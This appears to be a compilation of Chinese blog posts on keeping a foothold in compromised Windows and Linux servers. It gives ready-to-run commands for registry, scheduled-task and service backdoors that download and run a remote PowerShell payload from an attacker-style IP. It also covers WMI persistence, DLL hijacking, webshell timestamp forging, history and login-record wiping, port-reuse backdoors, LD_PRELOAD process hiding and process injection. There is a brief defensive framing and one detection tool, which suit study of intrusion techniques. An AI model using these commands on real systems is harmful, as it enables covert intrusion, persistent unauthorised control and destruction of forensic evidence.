https://blog.csdn.net/Fly_hps/article/details/80427707 \u51e0\u79cd\u540e\u95e8\u548c\u6743\u9650\u7ef4\u6301\u6280\u672f\u5916\u8fd8\u6709\u50cf\u662fdll\u52ab\u6301\u3001\u4e00\u4e9b\u8f6f\u4ef6\u7684\u63d2\u4ef6\u540e\u95e8\u3001office\u540e\u95e8\u7b49\u3002 https://blog.csdn.net/qq_33020901/article/details/89504902 \u7b2c2\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7 \u00b6 \u5173\u952e\u8bcd\uff1aWindows\u7cfb\u7edf\u540e\u95e8\u3001\u6743\u9650\u7ef4\u6301 \u5728\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u540e\uff0c\u901a\u5e38\u4f1a\u7528\u4e00\u4e9b\u540e\u95e8\u6280\u672f\u6765\u7ef4\u6301\u670d\u52a1\u5668\u6743\u9650\uff0c\u670d\u52a1\u5668\u4e00\u65e6\u88ab\u690d\u5165\u540e\u95e8\uff0c\u653b\u51fb\u8005\u4fbf\u5982\u5165\u65e0\u4eba\u4e4b\u5883\u3002\u672c\u6587\u5c06\u5bf9\u5e38\u89c1\u7684window\u670d\u52a1\u7aef\u81ea\u542f\u52a8\u540e\u95e8\u6280\u672f\u8fdb\u884c\u89e3\u6790\uff0c\u77e5\u5df1\u77e5\u5f7c\u65b9\u80fd\u675c\u7edd\u540e\u95e8\u3002 0x01 \u6ce8\u518c\u8868\u81ea\u542f\u52a8 \u901a\u8fc7\u4fee\u6539\u6ce8\u518c\u8868\u81ea\u542f\u52a8\u952e\u503c\uff0c\u6dfb\u52a0\u4e00\u4e2a\u6728\u9a6c\u7a0b\u5e8f\u8def\u5f84\uff0c\u5b9e\u73b0\u5f00\u673a\u81ea\u542f\u52a8\u3002 \u5e38\u7528\u7684\u6ce8\u518c\u8868\u542f\u52a8\u952e\uff1a # Run\u952e HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run # Winlogon\\Userinit\u952e HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon \u7c7b\u4f3c\u7684\u8fd8\u6709\u5f88\u591a,\u5173\u952e\u8bcd\uff1a\u6ce8\u518c\u8868\u542f\u52a8\u952e\u503c\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u53ef\u4ee5\u4e00\u952e\u5b9e\u73b0\u65e0\u6587\u4ef6\u6ce8\u518c\u8868\u540e\u95e8\uff1a reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Keyname\" /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\\\"\" /f Logon Scripts \u540e\u95e8 \u6ce8\u518c\u8868\u8def\u5f84\uff1aHKEY_CURRENT_USER\\Environment\\ \u521b\u5efa\u5b57\u7b26\u4e32\u952e\u503c\uff1a UserInitMprLogonScript\uff0c\u952e\u503c\u8bbe\u7f6e\u4e3abat\u7684\u7edd\u5bf9\u8def\u5f84\uff1a c:\\test.bat userinit\u540e\u95e8 \u5728\u7528\u6237\u8fdb\u884c\u767b\u9646\u65f6\uff0cwinlogon\u8fd0\u884c\u6307\u5b9a\u7684\u7a0b\u5e8f\u3002\u6839\u636e\u5b98\u65b9\u6587\u6863,\u53ef\u4ee5\u66f4\u6539\u5b83\u7684\u503c\u6765\u6dfb\u52a0\u4e0e\u5220\u9664\u7a0b\u5e8f\u3002 \u5229\u7528USERINIT\u6ce8\u518c\u8868\u952e\u5b9e\u73b0\u65e0\u6587\u4ef6\u540e\u95e8\uff1a [HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon] \"Userinit\"=\"C:\\\\Windows\\\\system32\\\\userinit.exe,C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\\\"\" 0x02 \u7ec4\u7b56\u7565\u8bbe\u7f6e\u811a\u672c\u542f\u52a8 \u8fd0\u884cgpedit.msc\u8fdb\u5165\u672c\u5730\u7ec4\u7b56\u7565\uff0c\u901a\u8fc7Windows\u8bbe\u7f6e\u7684\u201c\u811a\u672c(\u542f\u52a8/\u5173\u673a)\u201d\u9879\u6765\u8bf4\u5b9e\u73b0\u3002\u56e0\u4e3a\u5176\u6781\u5177\u9690\u853d\u6027\uff0c\u56e0\u6b64\u5e38\u5e38\u88ab\u653b\u51fb\u8005\u5229\u7528\u6765\u505a\u670d\u52a1\u5668\u540e\u95e8\u3002 \u5bb9\u6613\u9047\u5230\u7684\u95ee\u9898\uff1a\u811a\u672c\u9700\u5168\u8def\u5f84\uff0c\u5982 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 0x03 \u8ba1\u5212\u4efb\u52a1 \u901a\u8fc7window\u7cfb\u7edf\u7684\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\u529f\u80fd\u5b9e\u73b0\u5b9a\u65f6\u542f\u52a8\u67d0\u4e2a\u4efb\u52a1\uff0c\u6267\u884c\u67d0\u4e2a\u811a\u672c\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u53ef\u4ee5\u4e00\u952e\u5b9e\u73b0\uff1a schtasks /create /sc minute /mo 1 /tn \"Security Script\" /tr \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring(\\\"\\\"\\\"http://192.168.28.142:8888/logo.gif\\\"\\\"\\\"))\\\"\" \u5bb9\u6613\u9047\u5230\u7684\u95ee\u9898\uff1acmd\u547d\u4ee4\u884c\u6267\u884c\u5355\u5f15\u53f7\u4f1a\u88ab\u66ff\u6362\u6210\u53cc\u5f15\u53f7\uff0c\u6545\u8fd9\u91cc\u4f7f\u7528\u4e09\u4e2a\u53cc\u5f15\u53f7\u66ff\u4ee3\u3002 \u8ba1\u5212\u811a\u672c\u6bcf 1 \u5206\u949f\u8fd0\u884c\u4e00\u6b21\u3002 0x04 \u670d\u52a1\u81ea\u542f\u52a8 \u901a\u8fc7\u670d\u52a1\u8bbe\u7f6e\u81ea\u542f\u52a8\uff0c\u7ed3\u5408powershell\u5b9e\u73b0\u65e0\u6587\u4ef6\u540e\u95e8\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u53ef\u5b9e\u73b0\uff1a sc create \"KeyName\" binpath= \"cmd /c start powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\\\"\" sc description KeyName \"Just For Test\" //\u8bbe\u7f6e\u670d\u52a1\u7684\u63cf\u8ff0\u5b57\u7b26\u4e32 sc config Name start= auto //\u8bbe\u7f6e\u8fd9\u4e2a\u670d\u52a1\u4e3a\u81ea\u52a8\u542f\u52a8 net start Name //\u542f\u52a8\u670d\u52a1 \u6210\u529f\u521b\u5efa\u4e86\u4e00\u4e2a\u81ea\u542f\u52a8\u670d\u52a1 0x05 WMI\u540e\u95e8 \u57282015\u5e74\u7684blackhat\u5927\u4f1a\u4e0aMatt Graeber\u4ecb\u7ecd\u4e86\u4e00\u79cd\u65e0\u6587\u4ef6\u540e\u95e8\u5c31\u662f\u7528\u7684WMI\u3002\u8fd9\u91cc\u53ef\u4ee5\u5229\u7528\u4e00\u4e2a\u5de5\u5177powersploit\uff0c\u4e0b\u9762\u7528\u5b83\u7684Persistence\u6a21\u5757\u6765\u793a\u8303\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\u3002 Import-Module .\\Persistence\\Persistence.psm1 $ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM' $UserOptions = New-UserPersistenceOption -Registry -AtLogon Add-Persistence -FilePath .\\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose 0x06 dll\u52ab\u6301 \u5982\u679c\u5728\u8fdb\u7a0b\u5c1d\u8bd5\u52a0\u8f7d\u4e00\u4e2aDLL\u65f6\u6ca1\u6709\u6307\u5b9aDLL\u7684\u7edd\u5bf9\u8def\u5f84\uff0c\u90a3\u4e48Windows\u4f1a\u5c1d\u8bd5\u53bb\u6307\u5b9a\u7684\u76ee\u5f55\u4e0b\u67e5\u627e\u8fd9\u4e2aDLL\uff1b\u5982\u679c\u653b\u51fb\u8005\u80fd\u591f\u63a7\u5236\u5176\u4e2d\u7684\u67d0\u4e00 \u4e2a\u76ee\u5f55\uff0c\u5e76\u4e14\u653e\u4e00\u4e2a\u6076\u610f\u7684DLL\u6587\u4ef6\u5230\u8fd9\u4e2a\u76ee\u5f55\u4e0b\uff0c\u8fd9\u4e2a\u6076\u610f\u7684DLL\u4fbf\u4f1a\u88ab\u8fdb\u7a0b\u6240\u52a0\u8f7d\uff0c\u4ece\u800c\u9020\u6210\u4ee3\u7801\u6267\u884c\u3002 \u6bd4\u8f83\u5e38\u7528\u7684\u5982LPK.dll\u7684\u52ab\u6301\uff1a win7\u53cawin7\u4ee5\u4e0a\u7cfb\u7edf\u589e\u52a0\u4e86KnownDLLs\u4fdd\u62a4\uff0c\u9700\u8981\u5728\u6ce8\u518c\u8868\uff1a HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\ExcludeFromKnownDlls \u4e0b\u6dfb\u52a0 \u201clpk.dll\u201d \u624d\u80fd\u987a\u5229\u52ab\u6301\uff1a 0x07 COM\u52ab\u6301 \u5229\u7528COM\u52ab\u6301\u6280\u672f\uff0c\u6700\u4e3a\u5173\u952e\u7684\u662fdll\u7684\u5b9e\u73b0\u4ee5\u53caCLSID\u7684\u9009\u62e9\uff0c\u901a\u8fc7\u4fee\u6539CLSID\u4e0b\u7684\u6ce8\u518c\u8868\u952e\u503c\uff0c\u5b9e\u73b0\u5bf9CAccPropServicesClass\u548cMMDeviceEnumerator\u52ab\u6301\uff0c\u800c\u7cfb\u7edf\u5f88\u591a\u6b63\u5e38\u7a0b\u5e8f\u542f\u52a8\u65f6\u9700\u8981\u8c03\u7528\u8fd9\u4e24\u4e2a\u5b9e\u4f8b\u3002\u8fd9\u79cd\u65b9\u6cd5\u53ef\u4ee5\u7ed5\u8fc7Autoruns\u5bf9\u542f\u52a8\u9879\u7684\u68c0\u6d4b\u3002 0x08 \u8fdc\u7a0b\u63a7\u5236 \u8fdc\u63a7\u6728\u9a6c\u662f\u4e00\u79cd\u6076\u610f\u7a0b\u5e8f\uff0c\u5176\u4e2d\u5305\u62ec\u5728\u76ee\u6807\u8ba1\u7b97\u673a\u4e0a\u7528\u4e8e\u7ba1\u7406\u63a7\u5236\u7684\u540e\u95e8\u3002\u8fdc\u7a0b\u8bbf\u95ee\u6728\u9a6c\u901a\u5e38\u4e0e\u7528\u6237\u8bf7\u6c42\u7684\u7a0b\u5e8f\uff08\u5982\u6e38\u620f\u7a0b\u5e8f\uff09\u4e00\u8d77\uff0c\u662f\u4e00\u79cd\u770b\u4e0d\u89c1\u7684\u4e0b\u8f7d\uff0c\u6216\u4f5c\u4e3a\u7535\u5b50\u90ae\u4ef6\u9644\u4ef6\u53d1\u9001\u3002\u4e00\u65e6\u4e3b\u673a\u7cfb\u7edf\u88ab\u653b\u7834\uff0c\u5165\u4fb5\u8005\u53ef\u4ee5\u5229\u7528\u5b83\u6765\u5411\u5176\u4ed6\u6613\u53d7\u611f\u67d3\u7684\u8ba1\u7b97\u673a\u5206\u53d1\u8fdc\u7a0b\u8bbf\u95ee\u6728\u9a6c\uff0c\u4ece\u800c\u5efa\u7acb\u50f5\u5c38\u7f51\u7edc\u3002 \u4e00\u822c\u5206\u4e3a\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\uff0c\u5982\uff1a\u7070\u9e3d\u5b50\u3001\u4e0a\u5174\u8fdc\u63a7\u3001\u68a6\u60f3\u65f6\u4ee3\u3001QuasarRAT\u7b49\u3002 0x09 \u7ed3\u675f\u8bed \u672a\u77e5\u653b\u7109\u77e5\u9632\uff0c\u672c\u6587\u5206\u4eab\u4e86\u51e0\u79cdWindow\u4e0b\u7684\u81ea\u52a8\u542f\u6743\u9650\u7ef4\u6301\u6280\u672f\u3002\u7ba1\u7406\u5458\u5728\u5e73\u65f6\u8fd0\u7ef4\u8fc7\u7a0b\u5e94\u5f53\u4fdd\u6301\u8b66\u60d5\uff0c\u638c\u63e1\u4e00\u5b9a\u7684\u5165\u4fb5\u6392\u67e5\u6280\u5de7\uff0c\u53ca\u65f6\u8fdb\u884c\u7cfb\u7edf\u8865\u4e01\u66f4\u65b0\uff0c\u5b9a\u671f\u5bf9\u670d\u52a1\u5668\u5b89\u5168\u68c0\u67e5\uff0c\u624d\u80fd\u6709\u6548\u5730\u9884\u9632\u540e\u95e8\u3002 \u53c2\u8003\u6587\u7ae0\uff1a \u5e38\u89c1\u7684\u51e0\u79cdWindows\u540e\u95e8\u6301\u4e45\u5316\u65b9\u5f0f\uff1ahttps://www.freebuf.com/vuls/195906.html windows\u5e38\u89c1\u540e\u95e8\u9690\u85cf\u548c\u6743\u9650\u7ef4\u6301\u65b9\u6cd5 https://blog.csdn.net/qq_33020901/article/details/89504902 http://xnianq.cn/2018/07/23/windows%E5%90%8E%E9%97%A8%E7%A7%8D%E6%A4%8D%E6%96%B9%E5%BC%8F%E6%94%B6%E9%9B%86/ \u57fa\u4e8ePython\u7684\u9690\u79d8Windows\u540e\u95e8\uff0c\u4f7f\u7528Github\u4f5c\u4e3a\u547d\u4ee4\u548c\u63a7\u5236\u670d\u52a1\u5668 https://github.com/maldevel/canisrufus \u6ce8\u518c\u8868\u4f4d\u7f6e\u53c2\u8003 http://www.360doc.com/content/12/0217/15/1309227_187374989.shtml https://www.secpulse.com/archives/103301.html WMI\u540e\u95e8\u53c2\u8003 http://www.hackdig.com/11/hack-40748.htm https://blog.csdn.net/qq_17204441/article/details/91863383 \u65e0\u6587\u4ef6WMI\u548cPowerShell\u540e\u95e8 Windows \u4e0b\u7684\u6743\u9650\u7ef4\u6301\uff1ahttps://www.anquanke.com/post/id/171528 Windows\u4e0b\u7684\u6743\u9650\u7ef4\u6301\uff08\u4e8c\uff09https://www.anquanke.com/post/id/172851 \u7b2c3\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7 \u00b6 0x00 \u524d\u8a00 \u00b6 \u653b\u51fb\u8005\u5728\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u540e\uff0c\u4f1a\u901a\u8fc7\u4e00\u4e9b\u6280\u5de7\u6765\u9690\u85cf\u81ea\u5df1\u7684\u8e2a\u8ff9\u548c\u540e\u95e8\u6587\u4ef6\uff0c\u672c\u6587\u4ecb\u7ecdLinux\u4e0b\u7684\u51e0\u79cd\u9690\u85cf\u6280\u672f\u3002 0x01 \u9690\u85cf\u6587\u4ef6 \u00b6 Linux \u4e0b\u521b\u5efa\u4e00\u4e2a\u9690\u85cf\u6587\u4ef6\uff1a touch .test.txt touch \u547d\u4ee4\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\uff0c\u6587\u4ef6\u540d\u524d\u9762\u52a0\u4e00\u4e2a \u70b9 \u5c31\u4ee3\u8868\u662f\u9690\u85cf\u6587\u4ef6,\u5982\u4e0b\u56fe\uff1a \u4e00\u822c\u7684Linux\u4e0b\u7684\u9690\u85cf\u76ee\u5f55\u4f7f\u7528\u547d\u4ee4 ls -l \u662f\u67e5\u770b\u4e0d\u51fa\u6765\u7684\uff0c\u53ea\u80fd\u67e5\u770b\u5230\u6587\u4ef6\u53ca\u6587\u4ef6\u5939\uff0c\u67e5\u770bLinux\u4e0b\u7684\u9690\u85cf\u6587\u4ef6\u9700\u8981\u7528\u5230\u547d\u4ee4\uff1a ls -al \u8fd9\u91cc\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5728/tmp\u4e0b\uff0c\u9ed8\u8ba4\u5b58\u5728\u591a\u4e2a\u9690\u85cf\u76ee\u5f55\uff0c\u8fd9\u4e9b\u76ee\u5f55\u662f\u6076\u610f\u6587\u4ef6\u5e38\u7528\u6765\u85cf\u8eab\u7684\u5730\u65b9\u3002\u5982 /temp/.ICE-unix/\u3001/temp/.Test-unix/\u3001/temp/.X11-unix/\u3001/temp/.XIM-unix/ 0x02 \u9690\u85cf\u6587\u4ef6\u65f6\u95f4\u6233 \u00b6 Unix \u4e0b\u85cf\u540e\u95e8\u5fc5\u987b\u8981\u4fee\u6539\u65f6\u95f4\uff0c\u5426\u5219\u5f88\u5bb9\u6613\u88ab\u53d1\u73b0\uff0c\u76f4\u63a5\u5229\u7528 touch \u5c31\u53ef\u4ee5\u4e86\u3002 \u6bd4\u5982\u53c2\u8003 index.php \u7684\u65f6\u95f4\uff0c\u518d\u8d4b\u7ed9 webshell.php\uff0c\u7ed3\u679c\u4e24\u4e2a\u6587\u4ef6\u7684\u65f6\u95f4\u5c31\u4e00\u6837\u4e86\u3002 \u5229\u7528\u65b9\u6cd5 touch -r index.php webshell.php \u6216\u8005\u76f4\u63a5\u5c06\u65f6\u95f4\u6233\u4fee\u6539\u6210\u67d0\u5e74\u67d0\u6708\u67d0\u65e5\u3002\u5982\u4e0b 2014 \u5e74 01 \u6708 02 \u65e5\u3002 touch -t 1401021042.30 webshell.php 0x03 \u9690\u85cf\u6743\u9650 \u00b6 \u5728Linux\u4e2d\uff0c\u4f7f\u7528chattr\u547d\u4ee4\u6765\u9632\u6b62root\u548c\u5176\u4ed6\u7ba1\u7406\u7528\u6237\u8bef\u5220\u9664\u548c\u4fee\u6539\u91cd\u8981\u6587\u4ef6\u53ca\u76ee\u5f55\uff0c\u6b64\u6743\u9650\u7528ls -l\u662f\u67e5\u770b\u4e0d\u51fa\u6765\u7684\uff0c\u4ece\u800c\u8fbe\u5230\u9690\u85cf\u6743\u9650\u7684\u76ee\u7684\u3002 \u8fd9\u4e2a\u6280\u5de7\u5e38\u88ab\u7528\u5728\u540e\u95e8\uff0c\u53d8\u6210\u4e86\u4e00\u4e9b\u96be\u4ee5\u6e05\u9664\u7684\u540e\u95e8\u6587\u4ef6\uff0c\u4ee4\u5f88\u591a\u65b0\u624b\u670b\u53cb\u611f\u5230\u5934\u75bc\u3002 chattr +i evil.php \u9501\u5b9a\u6587\u4ef6 lsattr evil.php \u5c5e\u6027\u67e5\u770b chattr -i evil.php \u89e3\u9664\u9501\u5b9a rm -rf 1.evil.php \u5220\u9664\u6587\u4ef6 0x04 \u9690\u85cf\u5386\u53f2\u64cd\u4f5c\u547d\u4ee4 \u00b6 \u5728shell\u4e2d\u6267\u884c\u7684\u547d\u4ee4\uff0c\u4e0d\u5e0c\u671b\u88ab\u8bb0\u5f55\u5728\u547d\u4ee4\u884c\u5386\u53f2\u4e2d\uff0c\u5982\u4f55\u5728linux\u4e2d\u5f00\u542f\u65e0\u75d5\u64cd\u4f5c\u6a21\u5f0f\u5462\uff1f \u6280\u5de7\u4e00\uff1a\u53ea\u9488\u5bf9\u4f60\u7684\u5de5\u4f5c\u5173\u95ed\u5386\u53f2\u8bb0\u5f55 [space]set +o history \u5907\u6ce8\uff1a[space] \u8868\u793a\u7a7a\u683c\u3002\u5e76\u4e14\u7531\u4e8e\u7a7a\u683c\u7684\u7f18\u6545\uff0c\u8be5\u547d\u4ee4\u672c\u8eab\u4e5f\u4e0d\u4f1a\u88ab\u8bb0\u5f55\u3002 \u4e0a\u9762\u7684\u547d\u4ee4\u4f1a\u4e34\u65f6\u7981\u7528\u5386\u53f2\u529f\u80fd\uff0c\u8fd9\u610f\u5473\u7740\u5728\u8fd9\u547d\u4ee4\u4e4b\u540e\u4f60\u6267\u884c\u7684\u6240\u6709\u64cd\u4f5c\u90fd\u4e0d\u4f1a\u8bb0\u5f55\u5230\u5386\u53f2\u4e2d\uff0c\u7136\u800c\u8fd9\u4e2a\u547d\u4ee4\u4e4b\u524d\u7684\u6240\u6709\u4e1c\u897f\u90fd\u4f1a\u539f\u6837\u8bb0\u5f55\u5728\u5386\u53f2\u5217\u8868\u4e2d\u3002 \u8981\u91cd\u65b0\u5f00\u542f\u5386\u53f2\u529f\u80fd\uff0c\u6267\u884c\u4e0b\u9762\u7684\u547d\u4ee4\uff1a [Space]set -o history \u5b83\u5c06\u73af\u5883\u6062\u590d\u539f\u72b6\uff0c\u4e5f\u5c31\u662f\u4f60\u5b8c\u6210\u4e86\u4f60\u7684\u5de5\u4f5c\uff0c\u6267\u884c\u4e0a\u8ff0\u547d\u4ee4\u4e4b\u540e\u7684\u547d\u4ee4\u90fd\u4f1a\u51fa\u73b0\u5728\u5386\u53f2\u4e2d\u3002 \u6280\u5de7\u4e8c\uff1a\u4ece\u5386\u53f2\u8bb0\u5f55\u4e2d\u5220\u9664\u6307\u5b9a\u7684\u547d\u4ee4 \u5047\u8bbe\u5386\u53f2\u8bb0\u5f55\u4e2d\u5df2\u7ecf\u5305\u542b\u4e86\u4e00\u4e9b\u4f60\u4e0d\u5e0c\u671b\u8bb0\u5f55\u7684\u547d\u4ee4\u3002\u8fd9\u79cd\u60c5\u51b5\u4e0b\u6211\u4eec\u600e\u4e48\u529e\uff1f\u5f88\u7b80\u5355\u3002\u901a\u8fc7\u4e0b\u9762\u7684\u547d\u4ee4\u6765\u5220\u9664\uff1a history | grep \"keyword\" \u8f93\u51fa\u5386\u53f2\u8bb0\u5f55\u4e2d\u5339\u914d\u7684\u547d\u4ee4\uff0c\u6bcf\u4e00\u6761\u524d\u9762\u4f1a\u6709\u4e2a\u6570\u5b57\u3002\u4ece\u5386\u53f2\u8bb0\u5f55\u4e2d\u5220\u9664\u90a3\u4e2a\u6307\u5b9a\u7684\u9879\uff1a history -d [num] \u8fd9\u79cd\u6280\u5de7\u662f\u5173\u952e\u8bb0\u5f55\u5220\u9664\uff0c\u6216\u8005\u6211\u4eec\u53ef\u4ee5\u66b4\u529b\u70b9\uff0c\u6bd4\u5982\u524d150\u884c\u662f\u7528\u6237\u7684\u6b63\u5e38\u64cd\u4f5c\u8bb0\u5f55\uff0c150\u4ee5\u540e\u662f\u653b\u51fb\u8005\u64cd\u4f5c\u8bb0\u5f55\u3002\u6211\u4eec\u53ef\u4ee5\u53ea\u4fdd\u7559\u6b63\u5e38\u7684\u64cd\u4f5c\uff0c\u5220\u9664\u653b\u51fb\u75d5\u8ff9\u7684\u5386\u53f2\u64cd\u4f5c\u8bb0\u5f55\uff0c\u8fd9\u91cc\uff0c\u6211\u4eec\u53ea\u4fdd\u7559\u524d150\u884c\uff1a sed -i '150,$d' .bash_history 0x05 \u9690\u85cf\u8fdc\u7a0bSSH\u767b\u9646\u8bb0\u5f55 \u00b6 \u9690\u8eab\u767b\u5f55\u7cfb\u7edf\uff0c\u4e0d\u4f1a\u88abw\u3001who\u3001last\u7b49\u6307\u4ee4\u68c0\u6d4b\u5230\u3002 ssh -T root@127.0.0.1 /bin/bash -i \u4e0d\u8bb0\u5f55ssh\u516c\u94a5\u5728\u672c\u5730.ssh\u76ee\u5f55\u4e2d ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash \u2013i 0x06 \u7aef\u53e3\u590d\u7528 \u00b6 \u901a\u8fc7\u7aef\u53e3\u590d\u7528\u6765\u8fbe\u5230\u9690\u85cf\u7aef\u53e3\u7684\u76ee\u7684\uff0c\u5728Linux\u4e0b\uff0c\u5982\u4f55\u5b9e\u73b0\u7aef\u53e3\u590d\u7528\u5462\uff1f \u7b2c\u4e00\u79cd\u65b9\u5f0f\uff1a\u901a\u8fc7SSLH\u5728\u540c\u4e00\u7aef\u53e3\u4e0a\u5171\u4eabSSH\u4e0eHTTPS #\u5b89\u88c5SSLH sudo apt-get install sslh #\u914d\u7f6eSSLH \u7f16\u8f91 SSLH \u914d\u7f6e\u6587\u4ef6\uff1a sudo vi /etc/default/sslh 1\u3001\u627e\u5230\u4e0b\u5217\u884c\uff1aRun=no \u5c06\u5176\u4fee\u6539\u4e3a\uff1aRun=yes 2\u3001\u4fee\u6539\u4ee5\u4e0b\u884c\u4ee5\u5141\u8bb8 SSLH \u5728\u6240\u6709\u53ef\u7528\u63a5\u53e3\u4e0a\u4fa6\u542c\u7aef\u53e3 443 DAEMON_OPTS=\"--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid\" \u7b2c\u4e8c\u79cd\u65b9\u5f0f\uff1a\u5229\u7528IPTables\u8fdb\u884c\u7aef\u53e3\u590d\u7528 # \u7aef\u53e3\u590d\u7528\u94fe iptables -t nat -N LETMEIN # \u7aef\u53e3\u590d\u7528\u89c4\u5219 iptables -t nat -A LETMEIN -p tcp -j REDIRECT --to-port 22 # \u5f00\u542f\u5f00\u5173 iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT # \u5173\u95ed\u5f00\u5173 iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT # let's do it iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN \u5229\u7528\u65b9\u5f0f\uff1a #\u5f00\u542f\u590d\u7528 echo threathuntercoming | socat - tcp:192.168.28.128:80 #ssh\u4f7f\u752880\u7aef\u53e3\u8fdb\u884c\u767b\u5f55 ssh -p 80 root@192.168.28.128 #\u5173\u95ed\u590d\u7528 echo threathunterleaving | socat - tcp:192.168.28.128:80 \u5177\u4f53\u6587\u7ae0\u8be6\u89c1\uff1a \u8fdc\u7a0b\u9065\u63a7 IPTables \u8fdb\u884c\u7aef\u53e3\u590d\u7528 0x07 \u8fdb\u7a0b\u9690\u85cf \u00b6 \u7ba1\u7406\u5458\u65e0\u6cd5\u901a\u8fc7\u76f8\u5173\u547d\u4ee4\u5de5\u5177\u67e5\u627e\u5230\u4f60\u8fd0\u884c\u7684\u8fdb\u7a0b\uff0c\u4ece\u800c\u8fbe\u5230\u9690\u85cf\u76ee\u7684\uff0c\u5b9e\u73b0\u8fdb\u7a0b\u9690\u85cf\u3002 \u7b2c\u4e00\u79cd\u65b9\u6cd5\uff1alibprocesshider github\u9879\u76ee\u5730\u5740\uff1a https://github.com/gianlucaborello/libprocesshider \u5229\u7528 LD_PRELOAD \u6765\u5b9e\u73b0\u7cfb\u7edf\u51fd\u6570\u7684\u52ab\u6301\uff0c\u5b9e\u73b0\u5982\u4e0b # \u4e0b\u8f7d\u7a0b\u5e8f\u7f16\u8bd1 git clone https://github.com/gianlucaborello/libprocesshider.git cd libprocesshider/ && make # \u79fb\u52a8\u6587\u4ef6\u5230/usr/local/lib/\u76ee\u5f55\u4e0b cp libprocesshider.so /usr/local/lib/ # \u628a\u5b83\u52a0\u8f7d\u5230\u5168\u5c40\u52a8\u6001\u8fde\u63a5\u5c40 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload \u6d4b\u8bd5\uff1a\u8fd0\u884c evil_script.py\uff0c \u6b64\u65f6\u53d1\u73b0\u5728top \u4e0e ps \u4e2d\u90fd\u65e0\u6cd5\u627e\u5230 evil_script.py\uff0c cpu \u4f7f\u7528\u7387\u9ad8,\u4f46\u662f\u5374\u627e\u4e0d\u5230\u4efb\u4f55\u5360\u7528cpu\u9ad8\u7684\u7a0b\u5e8f\u3002 \u5982\u4f55\u5728Linux\u4e2d\u53d1\u73b0\u9690\u85cf\u7684\u8fdb\u7a0b\uff0c unhide \u662f\u4e00\u4e2a\u5c0f\u5de7\u7684\u7f51\u7edc\u53d6\u8bc1\u5de5\u5177\uff0c\u80fd\u591f\u53d1\u73b0\u90a3\u4e9b\u501f\u52a9rootkit\uff0cLKM\u53ca\u5176\u5b83\u6280\u672f\u9690\u85cf\u7684\u8fdb\u7a0b\u548cTCP / UDP\u7aef\u53e3\u3002\u8fd9\u4e2a\u5de5\u5177\u5728Linux\uff0cUNIX\u7c7b\uff0cMS-Windows\u7b49\u64cd\u4f5c\u7cfb\u7edf\u4e0b\u90fd\u53ef\u4ee5\u5de5\u4f5c\u3002 \u4e0b\u8f7d\u5730\u5740\uff1a http://www.unhide-forensics.info/ # \u5b89\u88c5 sudo yum install unhide # \u4f7f\u7528 unhide [options] test_list \u4f7f\u7528 unhide proc \u53d1\u73b0\u9690\u85cf\u8fdb\u7a0bevil_script.py\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a \u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff1a\u8fdb\u7a0b\u6ce8\u5165\u5de5\u5177linux-inject linux-inject\u662f\u7528\u4e8e\u5c06\u5171\u4eab\u5bf9\u8c61\u6ce8\u5165Linux\u8fdb\u7a0b\u7684\u5de5\u5177 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/gaffe23/linux-inject.git # \u4e0b\u8f7d\u7a0b\u5e8f\u7f16\u8bd1 git clone https://github.com/gaffe23/linux-inject.git cd linux-inject && make # \u6d4b\u8bd5\u8fdb\u7a0b ./sample-target # \u8fdb\u7a0b\u6ce8\u5165 ./inject -n sample-target sample-library.so \u9a8c\u8bc1\u8fdb\u7a0b\u6ce8\u5165\u6210\u529f\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a 